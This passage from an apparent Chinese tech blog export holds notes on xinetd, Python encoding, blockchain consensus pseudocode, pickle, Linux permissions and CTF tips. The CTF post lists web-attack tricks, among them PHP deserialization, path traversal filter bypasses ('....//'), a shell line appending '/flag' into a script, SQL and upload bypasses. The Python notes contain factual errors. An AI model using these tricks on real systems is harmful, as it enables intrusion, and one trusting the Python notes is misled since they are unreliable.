所以这里就配置：『 server_args = --daemon 』。与上面 server 搭配，最终启动服务的方式『/usr/bin/rsync --daemon』 user(服务所属UID) 配置值：[使用者账号] 如果 xinetd 是以 root 的身份启动来管理的，那么这个项目可以配置为其他用户。此时这个 daemon 将会以此配置值指定的身份来启动该服务的程序喔！举例来说，你启动 rsync 时会以这个配置值作为该程序的 UID。 group 跟 user 的意思相同！此项目填入组名即可。 一般配置项目：联机方式与联机封包协议 socket_type(封包类型) 配置值：[stream|dgram|raw]，与封包有关 stream 为联机机制较为可靠的 TCP 封包，若为 UDP 封包则使用 dgram 机制。raw 代表 server 需要与 IP 直接对谈！举例来说 rsync 使用 TCP ，故配置为『socket_type = stream 』 protocol(封包类型) 配置值：[tcp|udp]，通常使用 socket_type 取代此配置 使用的网络协议，需参考 /etc/protocols 内的通讯协议，一般使用 tcp 或 udp。由于与 socket_type 重复， 因此这个项目可以不指定。 wait(联机机制) 配置值：[yes(single)|no(multi)]，默认 wait = no 这就是我们刚刚提到的 Multi-threaded 与 single-threaded ！一般来说，我们希望大家的要求都可以同时被激活，所以可以配置『 wait = no 』 此外，一般 udp 配置为 yes 而 tcp 配置为 no。 instances(最大联机数) 配置值：[数字或 UNLIMITED] 这个服务可接受的最大联机数量。如果你只想要开放 30 个人联机 rsync 时，可在配置文件内加入：『 instances = 30 』 per_source(单一用户来源) 配置值：[一个数字或 UNLIMITED] 如果想要控制每个来源 IP 仅能有一个最大的同时联机数，就指定这个项目吧！例如同一个 IP 最多只能连 10 条联机『 per_source = 10 』 cps(新联机限制) 配置值：[两个数字] 为了避免短时间内大量的联机要求导致系统出现忙碌的状态而有这个 cps 的配置值。第一个数字为一秒内能够接受的最多新联机要求， 第二个数字则为，若超过第一个数字那暂时关闭该服务的秒数。 一般配置项目：登录文件的记录 log_type(登录档类型) 配置值：[登录项目 等级] 当数据记录时，以什么登录项目记载？且需要记载的等级为何(默认为 info 等级)。这两个配置值得要看过下一章登录档后才会知道哩！这边你先有印象即可。 log_on_successlog_on_failure(登录状态) 配置值：[PID,HOST,USERID,EXIT,DURATION] 在『成功登陆』或『失败登陆』之后，需要记录的项目：PID 为纪录该 server 启动时候的 process ID ， HOST 为远程主机的 IP、USERID 为登陆者的账号、EXIT 为离开的时候记录的项目、DURATION 为该用户使用此服务多久？ 进阶配置项目：环境、网络端口口与联机机制等 env(额外变量配置) 配置值：[变量名称=变量内容] 这一个项目可以让你配置环境变量，环境变量的配置守则可以参考第十一章。 port(非正规埠号) 配置值：[一组数字(小于 65534)] 这里可以配置不同的服务与对应的 port ，但是请记住你的 port 与服务名称必须与 /etc/services 内记载的相同才行！不过，若服务名称是你自定义的，那么这个 port 就可以随你指定 redirect(服务转址) 配置值：[IP port] 将 client 端对我们 server 的要求，转到另一部主机上去！呵呵！这个好玩呦！ 例如当有人要使用你的 ftp 时，你可以将他转到另一部机器上面去！那个 IP_Address 就代表另一部远程主机的 IP 啰！ includedir(呼叫外部配置) 配置值：[目录名称] 表示将某个目录底下的所有文件都给他塞进来 xinetd.conf 这个配置里头！这东西有用多了， 如此一来我们可以一个一个配置不同的项目！而不需要将所有的服务都写在 xinetd.conf 当中！你可以在 /etc/xinetd.conf 发现这个配置呦！ 安全控管项目： bind(服务接口锁定) 配置值：[IP] 这个是配置『允许使用此一服务的适配卡』的意思！举个例子来说，你的 Linux 主机上面有两个 IP ，而你只想要让 IP1 可以使用此一服务，但 IP2 不能使用此服务，这里就可以将 IP1 写入即可！那么 IP2 就不可以使用此一 server 啰 interface 配置值：[IP] 与 bind 相同 only_from(防火墙机制) 配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname] 这东西用在安全机制上面，也就是管制『只有这里面规定的 IP 或者是主机名可以登陆！』如果是 0.0.0.0 表示所有的 PC 皆可登陆，如果是 192.168.1.0/24 则表示为 C class 的网域！亦即由 192.168.1.1 ~ 192.168.1.255 皆可登陆！另外，也可以选择 domain name ，例如 .dic.ksu.edu.tw 就可以允许昆山资传系网域的 IP 登陆你的主机使用该 server ！ no_access(防火墙机制) 配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname] 跟 only_from 差不多啦！就是用来管理可否进入你的 Linux 主机激活你的 server 服务的管理项目！ no_access 表示『不可登陆』的 PC 啰！ access_times(时间控管) 配置值：[00:00-12:00, HH:MM-HH:MM] 这个项目在配置『该服务 server 启动的时间』，使用的是 24 小时的配置！例如你的 ftp 要在 8 点到 16 点开放的话，就是： 08:00-16:00。 umask 配置值：[000, 777, 022] 还记得在第七章提到的 umask 这个东西吗？呵呵！没错！ 就是那个鬼玩意儿啰！可以配置用户创建目录或者是文件时候的属性！系统建议值是 022 。 日志配置文件123456789101112131415#syslogd 服务的配置文件(记录了日志的危险等级以及存储的文件path)/etc/syslog.conf#日志轮替logrotate 服务的配置文件/etc/logrotate.conf #主要配置/etc/logrotate.d/* #详细配置#常用日志文件位于/var/log/*boot.log #启动日志cron #例行性工作日志maillog #系统邮件发送日志syslog #系统生成日志dmseg #系统内核日志wtmp #记录用户登陆的信息 防火墙设置三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器)三种常见的防火墙布线： 仅一个防火墙部署在路由器 内部需要保护的网络再多加一个防火墙 隔离态的网络服务器型防火墙部署（DMZ）]]></content>
  </entry>
  <entry>
    <title><![CDATA[python代码纠错琐碎]]></title>
    <url>%2F2018%2F03%2F01%2Fpython%E4%BB%A3%E7%A0%81%E7%BA%A0%E9%94%99%E7%90%90%E7%A2%8E%2F</url>
    <content type="text"><![CDATA[1. python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。 注意这里的string并不是侠义上的string（字符串），它表示的是已经编码过的数据类型，包括整数，字符串（这才是狭义上的string），以及bool型等等。而beta则是没有经过任何编码的存二进制流。所以这也是为啥在使用python3中的一些密码库的时候，按python2中的编码会出错的缘故。所以笔者打算搜集整理一下学习生活中所遇到的一些编码上的困惑，以及解决办法。 1.1 关于base64模块的调用在进行编码的时候必须要先对相应的要加密的字符串进行相应的编码。 其中的utf-8可以换成其他的编码方式，但是在解密的格式化输出的时候也别忘了进行相对应的解码操作。（python的默认的加密方式为utf-8） 12345import base64bytesString = copyright.encode(encoding=&quot;utf-8&quot;)encodestr = base64.b64encode(bytesString)encodestr.encode(&quot;utf-8&quot;)#假如不加utf-8也是可以的，因为默认的就是它 1.2 python对于文本的操作是有默认以unicode的编码方式写入和保存，所以如果是以其他编码方式（如utf-8）对文本写入（除了ascll，因为ascll被很多编码方式作为子集进行融入），但却以默认的unicode的方式打开就会报错。这也是用python以默认打开一些不是Unicode编码的文件会报错的原因了。但是，如果以二进制的操纵形式进行读取，却是可行的，因为python读取二进制是纯二进制脚本，只是读取二进制文件一般对于解决问题意义不大。12345678date="hello_world"open("test.text","w",encoding="utf-8").write(date)open("test.text","r").read()#报错open("test.text","r",encoding="utf-8").read()#正常输出open("test.text","rb").read()#正常输出 1.3 windows平台和类unix平台下的换行符是不一样的。 windows: \r\n 类unix: \r 所以在处理两个跨平台的文本的时候要留意。python的强大之处在于它会根据系统的不同自动的转换两种换行的方式。给我们处理文件带来了方便。python更为伟大的地方在于，如果我们以二进制的方式打开写入文本，它就会自动帮助我们关闭换行转换，以免我们在读取音频和视频的时候出错。 2.在进行一些类似path的参数设定的时候，例如path=“C:\XXX\XXX”之类的话，因为\符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError: (unicode error) ‘unicodeescape’ codec can’t decode bytes in position 2-3这样的错误。解决的方法大致有两种： 2.1. 类似于正则的转义问题，可以直接加re方可，path=re“C:\XXX\XXX” 2.2. 把’\’符号都换成’/也可以解决问题、 3.在使用matplotlib中绘图例如plt.title,plt.xlable之类在展示中出现中文乱码的情况，有以下两种解决方案 3.1 在每次写代码前加入以下两行代码 12plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号 3.2 把系统自带的字导入到matplotlib中去，这是一种比较长期的做法（由于这种方法在本机中测试成功，所以相关方法可以度娘一下）]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[漫步区块链]]></title>
    <url>%2F2018%2F02%2F28%2F%E6%BC%AB%E6%AD%A5%E5%8C%BA%E5%9D%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[1.0.0 宏观看区块链涉及分布式系统的共识，密码学传输加密，去中心化的一种新式的数据结构。建立在现如今大数据背景下分布式存储，以及一系列相对较为成熟的可以解决拜占庭结点问题分布式共识机制下，发展而来的，去中心化，更公开，更公正，也更安全的数据存储技术。区块链作为一个分布式数据存储，传输和分发的解决方案，其核心就是我们上面所说的如何在一个分布式的，无受信结点的环境下，自动达成共识的机制。尽管现在还处于发展萌芽阶段，但是比特币的“红遍大江南北”，使得这个技术逐渐进入人们的视线，引起了一大批研发人员的兴致，预言并参与这个技术革命的浪潮。 1.1.0 为什么区块链会广泛的受到关注？第一，区块链具有去中心化的特征，不以任何参与方为中心。这点可以和以往的中心化管理的数据库系统进行对比理解。所谓的去中心化，就是没有一个特定的结点去管理整个数据系统，任何一个结点都有对整个数据的备份，在满足协议的以及相关共识条件下，都可以进行对数据的查询或者修改的权利。去中心化的数据库可以带来一定效率的提升和成本的降低，从而提高利润。第二，区块链具有其也许吧热播的特征，也就是假定参与交易的任何一方都是不可信任的，通过共识机制，我们最后可以达成共识。这就很好的回应了互联网的痛点——诚信问题。总的来说就是，其核心特征：去中心化和去信任化，智能合约等特性很好的满足了未来互联网的发展所需要的信息高度自动化和高度程序化的安全流转需求。（以上部分参考了《区块链核心算法解析——推荐序二，推荐序三》） 1.2.0 分布式系统所谓的分布式的概念理解其实不难，就是原来一个机器的工作现在分给了很多台机器去共同完成，但是在逻辑上这些机器仍旧对外看来具有“只有一个机器在工作”的效果。这就好比算法里面的分而治之思想，只是这些物理层面上分散的，分布开的工作设备在逻辑上是一个设备，这些“资产”（暂且把这些设备看作一个分布式系统的资产）就组成了一个分布式系统。 1.2.1 分布式系统的产生分布式系统是随着信息产业的发展而演变而来的必然结果，受限于硬件性能优化的逐渐变得困难(即使摩尔定律至今还在有效)，但是人们对数据存储和cpu等硬件的性能需求在大数据时代是飞速的发展，那么为了解决这个问题，分布式系统就自然而然诞生了，并且承担了大数据信息时代的压力。也是分布式系统的逐渐完善，配合其他相关技术的发展，我们的信息化步伐才得以稳步前进。 1.2.2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。不可靠结点：结点因物理故障等原因消息传递或者说是节点间通讯延迟或者中断不可信结点：也即拜占庭结点，结点会自发产生不可预见性的行为，其行为异常可以不符合协议的约定（针对这种异常，比较容易通过检测机制察觉出来）。但是也有一些符合协议约定内容的，但是信息是编造的也就是我们平时所说的hacking行为，这种结点需要有特定的算法来达成共识，每个结点具有正确的一致性。 1.3.0 达成共识需要满足的三个条件：一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。可终止性：所有的好结点在有限的时间内结束决策过程有效性：选择出的值必须是某个节点的输入值1.4.0 需要明白的一些原理1.4.1 FLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。1.4.2 CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。 一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性； 可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求； 分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。 1.4.3 目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT1.4.4 有效性任何输入有效性：最终的决策值必须是某个节点的输入值正确输入有效性：决策值必须是某个好节点的输入值全部相同有效性：如果所有好结点起始具有相同的输入值v,则决策值也必须是v 1.5.0 比特币，以太坊和超级账本(hyperledger) 区块链的第一代——比特币，比特币是日本中本聪之作，它是区块链的骇世之作，也是目前最为成 熟的的区块链应用之一。比特币白皮书 区块链的第二代——以太坊,以太坊的诞生一定程度上是为了解决比特币的拓展性不足的问题。以太坊白皮书 区块链的第三代——超级账本，超级账本（hyperledger）白皮书 衍生阅读1：以太坊和hyperledger的比对衍生阅读2: thinking in blockchain 1.6.0 10步建立自己的区块链（参考IBM blockchain1.pdf） 区块链技术我的应用是否真的需要 在我的网络应用中交易行为是否面临这挑战，有哪些挑战 思考区块链会如何帮助我们应对这些挑战 Choosing an Appropriate Use Case 建立一个明确的区块链网络的宏观目标或者规划 思考区块链的建立始末相关的依赖性问题 选择一个现如今提供API的区块链项目平台，例如以太坊和超级账本等等 逐步完善和发展你的区块链代码 对你的产品进行测试 加入超级账本的交流社区，去里面交流技术，为区块链社区的发展贡献自己的一份力 1.7.0 核心算法笔记 两阶段协议与分布式容错算法Paxos两阶段协议12345678910阶段1：客户端像所有的服务器请求锁阶段2：if 如果客户端获得了所有服务的锁 then 该客户端以可靠的方式向每个服务器发送命令，与此同时释锁else 该客户端释放已经获得的锁 该客户端等待一段时间，重新进入阶段1end if 朴素的基于票的协议票：一种弱化的锁，一个服务器可以发布多个票，即使之前的票还没有释放。而锁的话服务器只能等上一个锁释放后才可以发放下一个。客户端通过票来取得与服务器的联络凭据。同时票具有时效性，也即服务器只认识最新发布的票。1234567891011121314151617阶段1：客户端向所有服务器请求一张票阶段2：if 收到超过半数的服务器回复then 客户端将获得票与命令一起发送给每个服务器 服务器检查票的状态，如果票仍然有效（也即最新），则储存命令并给该客户一个积极反馈（该反馈信息作为服务器可执行的通知）else 客户端等待，重新进入阶段1end if阶段3：if 客户端从过半数的服务处得到了正反馈then 客户端告诉所有的服务器执行之前的存储的命令else 客户端等待，然后重新进入阶段1end if Paxos算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354初始化阶段：客户端（提案者）：c 待执行命令c(commmend)t=0 当前尝试的票号t服务器（接受者）T_max=0 当前发布的最大票号代码C_Memory 当前存储的命令T_cmemory 用来存储命令c的票阶段1：客户端：t=t+1向所有的服务器发送消息，请求得到编号为t的票服务器：if t &gt; T_max then T_max=t 回复ok(T_cmemory,C_Memeory)end if阶段2：客户端：if 过半数的服务器回复ok then 选择T_cmemory值最大的ok携带的信息流，也即(T_cmemory,C_Memeory) if T_cmemory&gt;0 then c=C end if 向这些回复了ok的服务器发送提案：propose(t,c)end if服务器：if t = T_max then c=c T_cmemory=t 回复：sucecssend if阶段3：客户端：if 过半数的服务器回复success then 向每个服务器发送信息：excute(c)end if 随机共识机制(bool类型的决策)因为之前有提到LFP不可能存在一个确定的算法解决一致性问题。所以在公式的达成上面我们的算法一定是不确定的，这就是随机共识机制中“随机”的精妙之处。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vi=0 or 1round=1decided=false在分布式系统中广播myvalue(vi,round)while true do 1.提案 持续等待，直到收到过半数当前轮（round）的myvalue消息 if 所有的消息包含相同的值v then 广播提议propose(v,round) else 广播propose(本机存储的vi,round) end if if decided then 广播myvalue(vi，round+1) 确定决策之为vi,并且终止算法 end if 2.调整 持续等待，直到收到超过半数的当前轮（round）的propose消息 if 所有消息的提案（propose）同样的值v then vi=v decided=true else if 至少一个提案包含v then vi=v else 随机等可能的选择本地vi的决策值 end if round=round+1 广播myalue(vi,round)end while针对上述算法的改进，在随机选择本地决策值的部分可以采用共享硬币的算法加速决策效率，减少轮数，具体如下：以1/n的概率使得本地硬币（或者说是决策）c_x=0,否则c_x=1结点x广播mycoin（c_x）等待n-f个硬币的到来，并将他们存储在本地的硬币集合Cx中广播myset(Cx)等待n-f个硬币集合（n为结点数，f为最多故障结点数）if 在这些集合中，至少有一个硬币为0 then return 0else return 1end if 同步,异步模式下的拜占庭协定同步模式下国王算法（King algorithm）（容忍范围：f &lt; n/3 ）1234567891011121314151617181920212223x=本结点的输入值for 从第一轮到第f+1个阶段 do 第一轮 广播value(x) 第二轮 if 接收到了value（y）至少n-f次 then 广播propose(y) end if if 接收到propose(z)至少f次 then x=z end if 第三轮： 设结点vi是预先设定好的第i阶段的国王 国王vi广播它的当前值w if 接收到propose(x)的次数严格少于n-f then x=w end if end for 异步模式下的拜占庭协定算法（bool型,容忍范围f&lt; n/10）12345678910111213141516171819xi=(0|1)r =1 decided=false广播propose(xi,r)repeat 持续等待，直到接收到n-f条当前轮r的propose 消息， if 至少n/2+3f+1 propose 消息包含相同的值x then xi=x,decided=true else if 至少n/2+f+1 propose 消息包含同样的值x then xi=x else 随机选择xi,服从等概率 end if r=r+1 广播propose(xi，r)until decided(第8行)decision =xi 带认证的拜占庭协定同步模式下使用认证的拜占庭协定（bool型，容忍范围：f&lt;n）123456789101112131415161718主节点下:if 输入值为1 then 广播value(1)p 将1设为决策值并终止运行else 将0设为决策值并终止运行end if其他所有节点上v上运行的代码：for all rounds i 属于1，2，......，f+1 do S是所有value(1)u的消息集合 if |S|&gt;=i 并且value(1)p 属于S then 广播S与&#123;value(1)v&#125; 将1设为决策值并且终止运行 end ifend for将0设置为决策值 Zyzzyva算法（可以支持非bool型）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071在时刻t,客户端u希望执行命令c客户u将请求R=request(c,t)发送到主节点p主节点p将c增加到它的本地历史中，hp=(hp,c)主节点p向所有的副本发送OR=orderedrequest(hp,c,r)_ppoint1:每个副本r将命令c增加到它的本地历史中，hr=(hr,c),并且检查hr=hp是否成立每个副本r执行命令ck,并得到运行结果a每个副本r向客户端发送Response(a，OR)_r客户端u将接收到的Response(a，OR)_r消息存放到结合S中客户端检查所有的历史hr是否一致if |S|=3f+1 then 客户端认为命令c以及完成end if if 2f+1&lt;=|S|&lt;3f+1 then 客户端u向所有的副本发送Commit(S)_u 每个副本r向u回复LocalCommit(S)_r 客户端u至少收集到2f+1条LocalCommit(S)_r消息，于是认为命令c已经完成end ifif |S|&lt;2f+1 then 客户端u向所有的副本发送原始的R=Requst(c,t)_u消息 每个副本r向主节点发送一条ConfirmRequest(R)_r if 主节点p回复消息OR then 副本r将OR转发给所有的其他副本 goto point1 else 副本r广播IHatePrimary_r以启动视图改变 end if end if视图改变协定所有副本持续接收IHatatePrimary_r消息，并将它们存放于集合H中if 某个副本接收到了|H|&gt;f消息或者接收到了一条有效的ViewChange消息 then 副本广播ViewChange(Hr,hr,Sr)_r 副本停止参与当前的视图格局 副本切换到下一个主节点p=p+1end if执行视图改变新的主结点p将收集到的ViewChange(Hr,hr,Sr)_r消息存入集合Cif 新的主节点p接收到|C|&gt;=2f+1消息 then 新的主节点p向所有副本发送NewView(C)_p消息end ifif 副本r接收到一条NewView(C)_p消息 then 副本r恢复新的历史h_new： C=包含NewView(C)_p中2f+1ViewChange(Hr,hr,Sr)_r条消息的集合 R=C中的副本 S_l=C中的汇报的最近提交证书 h_new=S_l中包含的历史h_l k=l+1,下一个序列号 while 命令c_k 存在于C do if c_k被至少f+1个副本汇报 then 从R中删除哪些不支持c_k的副本 h_new=(h_new,c_k) end if k=k+1 end while return h_new 副本r向所有的副本广播ViewConfirm(h_new)_r if 副本接收到2f+1 ViewConfirm(h_new)_r消息 then 副本开始采用hr=h_new作为新的视图历史 副本r开始参与新的视图end if]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python序列化的疑惑]]></title>
    <url>%2F2018%2F02%2F25%2Fpython%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%96%91%E6%83%91%2F</url>
    <content type="text"><![CDATA[pickle 与 dill谈及对象的序列化，pickle与dill也许是用得最为频繁的两个库了，dill可以说是pickle的进化版，它所支持的对象类型要更多，但是仍旧还有一些局限性。 pickledill对象序列化是一种把存储于内存中的数据以二进制（序列化）的形式保存到磁盘中，方便下次调用的同时释放内存压力。而以上过程的逆过程就是反序列化。python是一门面向对象的编程语言，有一句话在python里面很哲学那就是“万物皆对象”。所以拥有了类似的将python的对象序列化存储的工具，无疑将会给编程带来很大的方便。 是的你没有理解错，就是连函数和class类型的对象也是可以被序列化的，也就是说，当你从磁盘使用load或者loads函数重新调用的时候会保留你实例化的python对象，并且该对象的方法也同样是可以调用的。那么基于这个原因，我们只需要使用短短两行代码就实现了这里面所说的所有序列化方法，就和你之前没有序列化时一摸一样。这样的底层封装思想可以给上层的程序员专注于实现应用本身而不是太多的在意轮子的制造。这或许就是python的简易，简洁的哲学吧。 同样的，对于一些特定的库，例如sklearn机器学习的库，本身就会有自己的一些序列化函数，例如“joblib”,这样的例子还有很多，他们的核心思想都是差不多的，特定的序列化函数（集成在一些大型库的内部）对于它要处理的数据类型和对象结构具有针对性，却不一定对其他的库有用。 好了说了这么多，来两个列子吧，这是最近在用scapy以及一些科学分析工具来做流量分析时候碰到的问题，所以这些感悟重新对序列化进行的一些反思。 12345678from scapy.all import rdpcapimport dillprint("hello")ini_data=rdpcap("test.pcapng")dill.dump(ini_data, open("游戏", "wb"))date=dill.load(open("游戏","rb"))print(date[1].show()) 首先，这里用pickle 是会报错的，具体原因笔者才疏，还没有很明白原因所在，报错中有“lambda”无名函数的关键字，然而笔者跟进到pickle库源码类中却没有发现“lambda”的函数所在，望以后能够渐渐弄明白。 同样笔者也看到官方文档中解释说在“functions defined at the top level of a module (using def, not lambda)”，笔者一知半解就去故意构造了一个类，其中使用了lambda来生成一个列表，发现这里是不会报错的。代码如下：12345678910111213141516171819202122import pickleimport mathclass pickle_hello(): def __init__(self): self.name="daming" self.sex='boy' self.number=1.456468 def print_name(self): print("hello",name) def floor(self): print(math.floor(self.number)) lis=filter(lambda x:x+1,[x for x in range(1,10)]) print(list(lis)[::-1]) obj1=pickle_hello()pickle.dump(obj1,open("t1","wb"))obj2=pickle.load(open("t1","rb"))print(obj2.floor()) 先把问题记录在这，日后顿悟再回来补充……]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux权限]]></title>
    <url>%2F2018%2F02%2F25%2FLinux%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[基本权限以及用户，用户组 execute(1),write(2),read(4) 拥有着，用户组（以及有效用户组的概念），其他人的概念，以及对应的权限显示格式“[-/d]xxx-xxx-xxx-:表示的是文件d(directory):表示的是目录 权限三剑客：chown,chgrp,chmod(u,o,g,a;w,r,x;+,-,=)，umask(修改新建文件的默认权限) 用户信息存放地：/etc/passwd 另外：密码md5存放地：/etc/shadow用户组的信息存放：/etc/groupsGID,UID的标识符 /etc/passwd的文件结构（按字段进行标号）： 账号名称 密码（现已保存在shadow文件中，该字段已经没有意义） UID GID 用户指纹信息（finger） 用户主文件夹 默认shell环境 /etc/shadow文件结构（按字段标号） 账号名称 密码(md5加密) 最近更改时间 与最近更改时间相比密码不能更改的时间 密码需要重新更改的天数 在密码需要更改时提前警告的天数 过期宽限时间 账号失效时间 目前没有意义，保留字段 /etc/group的文件结构 用户组名称 用户组密码 GID 该用户组的所有用户成员 常用的查看命令：whoami(查看当前登陆用户),who(类似于w以及单独使用的finger),groups(所属用户组),finger(查看用户指纹信息)，id(查看用户序号信息，uid,有效用户组gid,所有所属用户组gid） 123#查看所有用户cut -d : -f 1 /etc/passwdcat /etc/passwd |awk -F \: &apos;&#123;print $1&#125;&apos;#其他字段的查看依次类推 常用操作命令：useradd，userdel，usermod,,finger,chfn(修改finger),passwd(以及chage),id,chsh(更改默认shell环境);groupadd,groupmod,groupdel,groupwd(用户组管理员功能) 常用的操作对应的底层文件及其内容 指纹信息描述字段，也可以理解为账户备注：~/.plan(用户组文件夹的隐藏文件) useradd的参考文件：/etc/default/useradd UID/GID以及相关参数： /etc/login.defs 主文件夹参考目录： /etc/skel/* 文件隐藏权限 在rwx三种权限之外还有着一些隐藏的权限，例如文件只允许追加，不能被删除和删除，两个命令：lsattr(显示隐藏属性)，chattr(修改隐藏属性，常用的有-i(文件锁定),-a(文件只能追加)) 文件的特殊权限 文件的特殊权限主要有三种：SUID,SGID,SBIT。在ls命令列出文件的相关权限后，有时候会在拥有者或者用户组字段出现”s”的标识符，这个s就是指SUID,SGID权限（二者的不同在于s出现的字段，当出现在用户字段，那么就是SUID,出现在用户组字段就是SGID),当在其他人的权限字段出现”t”的时候，就表示该目录具有SBIT的特殊权限。 SUID:拥有SUID权限的执行者在执行该二进制文件的时候临时具有所有者的权限要求：仅仅正对二进制文件有效执行者需要对该程序具有x的可执行权限SUID权限仅在该程序执行过程中有效 SGID:拥有SGID权限文件的执行者在执行该二进制程序的时候具有用户组的权限要求:仅仅正对二进制文件有效执行者需要对该程序具有x的可执行权限SUID权限仅在该程序执行过程中有效 SBIT:用户在该目录下创建文件时只有自己与root才具有权力删除该文件夹要求:只对目录有效，SBIT只对目录可见，一般文件不具有这个权限用户需要对这个目录具有w,x的权限 SUID/SGID/SBIT对应的数字: SUID(4),SGID(2),SBIT(1) 权限的设置同样是使用chmod命令，特殊权限的赋予有多种方式，如果使用数字权限赋予需要在最前面，如果使用（u,g,o,a）追加需要加在对应的位置:u+s/g+s以及o+t ACL个性化权限 区别于统一化的权限设置，例如，针对三种身份的权限设定，ACL(acecess control list)对单一的目录进行个性化的权限定制，定制的对象可以是单个用户，也可以是用户组。 setfacl与getfacl命令的使用 SELinux(Security-Enhanced Linux)linux下的用户身份转换 切换用户的身份有su和sudo两种方式 su可以进行任意用户的切换(su -l )，但是必须需要知道所要切换到的用户的密码，而sudo当然也可以切换到任意用户(sudo -u),但是切换的对象需要记载在配置文件里面，只不过sudo不需要知道将要切换的用户密码，只需要知道自己的密码就ok。而sudo的管理也还是比较方便的，只需要编写配置文件/etc/sudoers就可以了。 visudo方便的设置/etc/sudoers，/etc/sudoers文件下的字段含义： 用户账号 允许的登陆者来源主机 可以登陆到的主机即可以切换到身份 切换用户后可以执行的命令(多半是出于安全考虑)]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF]]></title>
    <url>%2F2018%2F01%2F25%2FCTF%2F</url>
    <content type="text"><![CDATA[这是一篇不系统的，比较杂碎的ctf涉及的小技巧汇总，灵光一现的记录自己在做题或者看writeup中的一些小细节，正所谓“不积细流，无以成江海”。 1.zip —symble命令进行压缩后的文件是可以跨宿主机传递link信息的，然后解压成的文件会在新的宿主机里面进行新的连接，从而在php中的命令执行函数，如shell_exec（）解压命令可以造成宿主机信息泄露.例子传送门 2.PHP的序列化与反序列化php反序列化成立的条件： 一个用户可空的反序列点 这个反序列点的过滤是不完全的，也即hacker可以去绕过过滤传入一个对象。 在程序中存在有一个或多个可以利用的魔术方法：__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()，__invoke()， __set_state()， __clone() 和 __debugInfo() ,在这里我们主要关注点在于__wakeup(),destruct(),__construst(),其他魔术方法的利用方式的发掘相对来说还是比较困难的。 源码审计发现一条行之有效的链。 原理常用魔术方法解析题目1:cookie腐朽序列化题目2:session的序列化modify与eval执行拓展阅读:session与cookie的关系以及作用机理其中有一点需要明确：cookie作为client端的认证。session作为server端的认证，二者的关系：cookie作为server端的session序列化的文件名，而文件内容就是session的值，这样就是二者一一对应的关系。session在server端的保存地址：C:\WINDOWS\Temp(windows); /tmp(linux)cookie在client端的保存地：不同的操作系统不同的浏览器的保存位点一般不一样。一句话总结：Basicly, all session variables stored as a file with format sess_(PHPSESSID) in folder session.save_path and the content stored as serialized string 3.PHP中的$_REQUEST传参是具有默认顺序的，使用$_REQUEST作为检测点往往会造成重写绕过。以下为php官方文档的user note中的一段原话：Note you should use $_GET, $_POST and $_COOKIE seperately if you use same name or your not sure.Because there are “overwrite” problems with $_REQUEST :123456Example: $_GET['foo'] is a 'hello' string //from user input$_POST['foo'] is a 'world' string //from user input #Then the $_REQUEST['foo'] would be a 'world' string. The value 'hello' is overwritten.#So don't use $_REQUEST to monitor user inputs. 例如：ctf一道sql注入题4.一个tip在bash shell 文件中将执行的输出写入到本文件，在ctf中限制了读取文件范围的时候，可以直接将输出结果以追加的方式重定向到可执行脚本中。1234#!/bin/shcat /flag &gt;&gt; "./$&#123;0##*/&#125;";#格式： command &gt;&gt; "./$&#123;0##*/&#125;" ctf中一道使用例题5.本地文件包含中我们可以做的一些信息提取或者提权6.尝试不同的http请求方法7.关于源码泄露例题1：git gud 例题2：.git实现备份还原 还有一中比较常见的源码泄露：vim源码泄露可以通过在文件名后追加~或者.swp就可以获取，这常在web类的url获取源码题中，有时获取到的问价是混乱的，我们可以使用linux下的命令回复文件： 1vim -r [混乱的文件名] 概括了一些java泄露源码的思路 8.url编码绕过一道php,执行ctf题 9.路径遍历中如果过滤函数为str_replace(&quot;../&quot;,&quot;./&quot;,$(变量))，可以使用.../绕过，对于../被删除的filter,使用....//思想绕过 BookDir10. 一次很典型的sql注入的解题思路 11. php随机数预测crack12.php获取信息的$_SERVER数组 $_SERVER[‘HTTP_CLIENT_IP’],$_SERVER[‘HTTP_X_FORWARDED_FOR’]里面的用户ip是不可靠的（他们来自于用户的http请求头），只有$_SERVER[‘REMOTE_ADDR’]是基于tcp/ip协议底层的ip地址。 13.select `version()` ，可以用来过空格和正则，特殊情况下还可以将其做注释符用这是一道非常厉害的ctf题 14.常用的命令执行函数：14.1 exec,system,popen,shell_exec(与反撇号`执行的效果差不多)，passthru,proc_open，eval`(这个不是系统命令执行，而实php代码执行)15. 在绕过上传漏洞出现较多的文件后缀过滤的情况，可以尝试先上传.htaccess 